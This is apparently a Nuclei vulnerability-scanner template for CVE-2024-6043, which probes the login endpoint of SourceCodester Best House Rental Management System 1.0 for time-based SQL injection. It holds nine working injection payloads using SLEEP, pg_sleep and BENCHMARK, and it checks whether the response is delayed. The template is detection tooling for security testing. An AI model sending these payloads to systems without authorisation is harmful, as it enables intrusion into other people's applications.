id: CVE-2024-6043

info:
  name: SourceCodester Best House Rental Management System 1.0 SQL Injection (Time-Based)
  author: Alireza Mokhtari
  severity: high
  description: Detects SQL Injection vulnerability in SourceCodester Best House Rental Management System 1.0 'username' parameter using various time-based techniques.
  reference:
    - https://github.com/yezzzo/y3/blob/main/SourceCodester%20Best%20house%20rental%20management%20system%20project%20in%20php%201.0%20SQL%20Injection.md
    - https://nvd.nist.gov/vuln/detail/CVE-2024-6043
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2024-6043
    cwe-id: CWE-89
  tags: sql-injection,sourcecodester,php

requests:
  - method: POST
    path:
      - "{{BaseURL}}/rental/ajax.php?action=login"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: nuclei

    body:
      - "username=admin' AND (SELECT 5426 FROM (SELECT(SLEEP(5)))ABPy) AND 'wtFY'='wtFY&password=pass"
      - "username=admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- a&password=pass"
      - "username=admin' AND pg_sleep(5)--&password=pass"
      - "username=admin' AND BENCHMARK(5000000,MD5(1))-- &password=pass"
      - "username=sleep(5)#&password=pass"
      - "username=\" or sleep(5)#&password=pass"
      - "username=' or sleep(5)#&password=pass"
      - "username=\" or pg_sleep(5)--&password=pass"
      - "username=' or pg_sleep(5)--&password=pass"

    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - "response.time > 5000"

